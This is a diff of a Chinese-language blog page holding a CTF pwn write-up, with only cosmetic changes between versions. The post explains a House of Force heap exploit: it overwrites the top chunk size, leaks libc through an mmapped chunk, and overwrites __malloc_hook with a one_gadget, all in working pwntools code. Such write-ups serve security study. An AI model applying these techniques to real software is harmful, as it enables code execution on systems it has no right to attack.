@@ -75,7 +75,7 @@
         		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
             	<ul class="sb-submenu">
 				  	
-				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(23)</small></a></li>
+				    <li><a href="/categories/AUDITION/" class="animsition-link">AUDITION<small>(22)</small></a></li>
 				    
 				    <li><a href="/categories/CSAPP-LAB/" class="animsition-link">CSAPP LAB<small>(1)</small></a></li>
 				    
@@ -263,8 +263,7 @@
         </div>
         <div class="col-md-8 col-md-offset-2">
       		
-    <div id="aplayer-veRCYMon" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
-
+    <div id="aplayer-kDTOUrIy" class="aplayer aplayer-tag-marker meting-tag-marker" data-id="7342554262" data-server="netease" data-type="playlist" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#555"></div> 
 <h2><span id="overview">overview</span></h2><p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8A%E5%8D%8811.22.37.png" alt="截屏2022-03-30 上午11.22.37"></p>
 <p>好绿。</p>
 <h2><span id="逆向">逆向</span></h2><p>​        程序比较简约，只有add和put两个功能。逻辑也不复杂。漏洞的话也比较明显，一个是程序直接把heap base白给了。另一个是虽然询问了size的大小，但是在实际add的时候完全没有根据size分配chunk,并且可以分配很大size的chunk。</p>
@@ -272,9 +271,6 @@
 <p>​        导致我们可以很轻易地修改top chunk的size。        </p>
 <p>​        并且put功能看起来只能打印D93上的东西,也就是一个空字节。</p>
 <h2><span id="利用">利用</span></h2><h3><span id="修改top-chunk-size">修改top chunk size</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendafter(<span class="string">&quot;content&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xffffffffffffffff</span>)*<span class="number">2</span>)</span><br></pre></td></tr></table></figure>
-
-
-
 <p><img src="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/%E6%88%AA%E5%B1%8F2022-03-30%20%E4%B8%8B%E5%8D%883.07.21.png" alt="截屏2022-03-30 下午3.07.21"></p>
 <p>​        但是随之而来的问题就是，除了程序白给的chunk ptr以外，没有任何输出函数，以至于无法leak libc。所以只能从这个免费打印的ptr下手。</p>
 <p>​        一个trick就是，我们可以add一个巨大的chunk，巨大到需要mmap来分配空间，而mmap分配的内存空间与libc是有固定的偏移的，我们能够轻易地拿到mmap分配的chunk的地址，也就能计算出libc base。</p>
@@ -283,14 +279,8 @@
 <p>​        可以看到，比如我们获得了addr为<code>0x7fe8af273000</code>，那么这个地址与libc基址的偏移就是<code>0x76F000</code>。</p>
 <p>​        这样就能够leak libc，计算malloc hook的地址了。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak libc with mmap</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;100000000000&#x27;</span>)</span><br><span class="line">chunk_addr  = u64(p.recvuntil(<span class="string">&quot;bin addr &quot;</span>)[:<span class="number">8</span>])</span><br><span class="line">libc_base = chunk_addr + <span class="number">0x76F000</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">malloc_hook_addr = libc_base + libc.symbols[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​        接着就是修改top chunk的指针，这里主要涉及到hof的知识点，需要注意的就是offset的计算。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#leak top chunk addr</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;2:puts\n&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bin addr &quot;</span>)</span><br><span class="line">top_chunk_addr = u64(p.recv(<span class="number">8</span>)) - <span class="number">0x20</span></span><br><span class="line">log.info(<span class="string">&quot;top_chunk_addr :&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(top_chunk_addr)))</span><br><span class="line"><span class="comment">#modify top chunk addr</span></span><br><span class="line">p.sendafter(<span class="string">&quot;content&quot;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + p64(<span class="number">0xffffffffffffffff</span>)*<span class="number">2</span>)</span><br><span class="line"><span class="comment">#modify top chunk ptr</span></span><br><span class="line">fake_size  = malloc_hook_addr - top_chunk_addr - <span class="number">0x10</span><span class="comment">#0x2AAAA27CA9C0</span></span><br><span class="line">add(fake_size,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#modify malloc hook space with onegadget</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(libc_base + one_gadget))</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
 <p>​        </p>
 <p>​</p>
 
